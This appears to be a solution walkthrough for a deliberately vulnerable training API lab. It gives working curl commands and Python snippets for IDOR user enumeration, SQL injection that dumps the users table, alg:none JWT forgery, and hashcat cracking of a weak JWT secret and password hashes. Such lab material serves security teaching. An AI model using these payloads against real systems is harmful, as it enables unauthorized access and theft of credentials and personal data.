# api-lab — Solution

**Port:** `3000`

---

## Phase 1: Reconnaissance

### Step 1 — Register and log in
```bash
curl -s -X POST http://<target>:3000/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123","email":"a@x.com"}'

TOKEN=$(curl -s -X POST http://<target>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass123"}' \
  | jq -r '.token')
```

---

## Phase 2: IDOR — access other users' data

The `/api/users/:id` endpoint returns full user records with no ownership check.

### Step 2 — Enumerate users
```bash
for i in 1 2 3 4 5; do
  curl -s http://<target>:3000/api/users/$i \
    -H "Authorization: Bearer $TOKEN" | jq '{id,username,email,apiKey}'
done
```
User 1 is `admin`. Note the `password` hash and `apiKey` fields — both leak.

---

## Phase 3: SQL injection — product search

The `q` parameter is interpolated directly into a SQLite query.

### Step 3 — Dump all products
```bash
curl -s "http://<target>:3000/api/products/search?q=a'+OR+1=1--" \
  -H "Authorization: Bearer $TOKEN" | jq .
```

### Step 4 — Extract user table via UNION
SQLite UNION injection — find column count first (products has 4 cols: id, name, description, price):
```bash
# Confirm 4 columns
curl -s "http://<target>:3000/api/products/search?q=x'+UNION+SELECT+1,2,3,4--" \
  -H "Authorization: Bearer $TOKEN"

# Dump users
curl -s "http://<target>:3000/api/products/search?q=x'+UNION+SELECT+id,username,password,email+FROM+users--" \
  -H "Authorization: Bearer $TOKEN" | jq .
```
Admin hash: `$2a$08$...` — crack offline with hashcat mode `3200`.

---

## Phase 4: JWT attack — alg:none forgery

### Step 5 — Forge an admin token with alg:none
```python
import base64, json

header  = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
payload = base64.b64encode(json.dumps({"userId":1,"username":"admin","iat":9999999999}).encode()).decode().rstrip("=")
token   = f"{header}.{payload}."
print(token)
```

### Step 6 — Access admin panel
```bash
curl -s http://<target>:3000/api/admin/users \
  -H "Authorization: Bearer <FORGED_TOKEN>" | jq .
```

---

## Phase 5: JWT — weak secret (HS256)

### Step 7 — Crack the JWT secret with hashcat
```bash
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt
# Secret: "secret"
```

### Step 8 — Sign an admin JWT with the cracked secret
```python
import jwt
token = jwt.encode({"userId":1,"username":"admin"}, "secret", algorithm="HS256")
print(token)
```
Use this token for any endpoint including `/api/admin/users`.

---

## Flags
- IDOR user data leak: check user 1's fields
- SQL injection: user table dump
- Admin access: `GET /api/admin/users` returns all user records
